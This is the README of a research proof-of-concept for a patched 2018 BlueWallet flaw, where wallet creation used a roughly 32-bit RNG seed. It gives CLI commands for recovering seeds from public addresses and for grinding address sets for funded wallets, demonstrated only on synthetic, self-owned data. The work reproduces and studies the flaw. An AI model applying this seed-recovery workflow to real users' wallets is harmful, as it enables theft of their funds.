# BlueWallet ISAAC CREATE — Proof of Concept

Self-contained reproduction of a historical, **already-patched** vulnerability
in BlueWallet **≤ v3.0.0**: new-wallet CREATE drew key material from
`isaac@0.0.5`, which auto-seeds once with `Math.random() * 0xffffffff`
(~32 effective bits). Every CREATE outcome is therefore a deterministic function
of a ~32-bit seed, and the whole output space is offline-enumerable.

See [`../docs/EXPLOIT.md`](../docs/EXPLOIT.md) for the full exploit definition.
Fixed upstream in **v3.2.0** (2018). This PoC operates only on locally generated
test wallets — never on real users or modern builds.

## Install

```bash
cd poc
python3 -m pip install -r requirements.txt
```

`coincurve` (native libsecp256k1) is used automatically if present for a faster
public-key path; otherwise the pure-python `ecdsa` fallback is used. Results are
identical either way.

## Usage

```bash
# 1) Determinism proof — reproduce the golden vectors (bit-for-bit vs Node).
python3 demo.py vectors

# 2) Show everything a given ISAAC seed produces.
python3 demo.py wallet 1 --gaps 3

# 3) Viability proof — recover an unknown seed from a public address alone.
python3 demo.py recover --kind segwit_p2sh --range 100000 --rng-seed 7
python3 demo.py recover --kind bip49 --range 20000

# 4) Cost extrapolation — throughput vs the full 2**32 space.
python3 demo.py benchmark --kind segwit_p2sh --seeds 20000

# 5) Full-space grind — locate "previously funded" seeds via funded-set
#    intersection. Demonstrated ONLY against a synthetic, self-owned set.
python3 tools/make_synthetic_funded_set.py --range 60000 --planted 3 --decoys 40000
python3 demo.py grind --funded data/synthetic_funded.txt --end 60000 \
    --kinds segwit_p2sh --workers 4 --reveal \
    --expect-planted data/synthetic_planted.json
```

### Scope of the grind

The grind engine intersects derived addresses with a funded-address file and is
demonstrated **only** against a synthetic set of locally generated, self-owned
addresses. It does not fetch blockchain data. Producing the seeds/private keys of
real third-party wallets from real funded data is out of scope regardless of
current balance — see [`../docs/EXPLOIT.md`](../docs/EXPLOIT.md) §6.3. Note that
the source research's own full-space funded grind returned **zero** hits, so
"funded seeds exist to be located" should not be assumed.

## Tests

```bash
python3 -m pytest tests/ -q
```

The suite pins golden vectors, checks JS↔Python parity for 8 seeds spanning the
`2**32` range (including boundaries `0` and `2**32-1`), verifies core Bitcoin
primitives against known secp256k1 vectors, and does end-to-end seed-recovery
round-trips for both CREATE paths.

## Layout

```
poc/
  bluewallet_isaac/
    isaac.py      faithful isaac@0.0.5 port
    create.py     BlueWallet v3.0.0 CREATE chains
    bitcoin.py    secp256k1 / Base58Check / BIP32 / BIP49 / addresses
    attack.py     seed enumeration + recovery + benchmark
    grind.py      resumable full-space funded-set intersection
  tools/
    make_synthetic_funded_set.py   synthetic (self-owned) funded set generator
  demo.py         CLI (vectors / wallet / recover / benchmark / grind / reveal)
  tests/          golden-vector + parity + recovery + grind tests
```

## Address-kind → CREATE-path map (Era A)

| `--kind` | CREATE path | Prefix | Address | Note |
|----------|-------------|--------|---------|------|
| `bip49` | HD BIP39 → BIP49 | `hello there` | `3…` `m/49'/0'/0'/0/i` | default UI option |
| `segwit_p2sh` | single-key ECDSA | `oh hai!` | `3…` nested SegWit | UI option #2 |
| `legacy` | single-key ECDSA | `oh hai!` | `1…` P2PKH | not offered in Era A UI (low value) |
